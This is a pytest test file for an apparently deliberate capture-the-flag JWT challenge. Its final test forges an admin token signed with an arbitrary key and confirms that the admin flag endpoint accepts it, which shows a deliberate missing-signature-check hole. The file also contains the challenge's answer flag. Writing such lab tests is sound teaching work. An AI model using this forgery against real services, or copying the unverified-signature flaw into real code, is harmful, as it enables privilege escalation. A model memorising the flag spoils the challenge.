import jwt
import pytest
import app as challenge


@pytest.fixture
def client():
    challenge.app.config["TESTING"] = True
    return challenge.app.test_client()


def test_status(client):
    response = client.get("/api/status")
    assert response.status_code == 200
    assert response.get_json()["status"] == "online"


def test_issue_and_verify_employee_token(client):
    token_resp = client.get("/api/token")
    assert token_resp.status_code == 200
    token = token_resp.get_json()["token"]

    verify_resp = client.get(f"/api/verify?token={token}")
    assert verify_resp.status_code == 200
    data = verify_resp.get_json()
    assert data["valid"] is True
    assert data["claims"]["role"] == "employee"


def test_strict_verify_rejects_forged_token(client):
    forged = jwt.encode(
        {"sub": "hacker", "role": "admin"},
        "wrong-secret-key",
        algorithm="HS256"
    )
    response = client.get(f"/api/verify?token={forged}")
    assert response.status_code == 401


def test_employee_token_rejected_by_admin(client):
    token = client.get("/api/token").get_json()["token"]
    response = client.get(
        "/api/admin/flag",
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 403


def test_unverified_signature_exploit_works(client):
    # Attacker forges a token with role='admin' using an arbitrary key
    forged_admin_token = jwt.encode(
        {"sub": "employee_01", "role": "admin", "iss": "Internal Auth API"},
        "attacker-arbitrary-key",
        algorithm="HS256"
    )

    response = client.get(
        "/api/admin/flag",
        headers={"Authorization": f"Bearer {forged_admin_token}"}
    )
    assert response.status_code == 200
    assert response.get_json()["flag"] == "HNS{jwt_unverified_signature_demo}"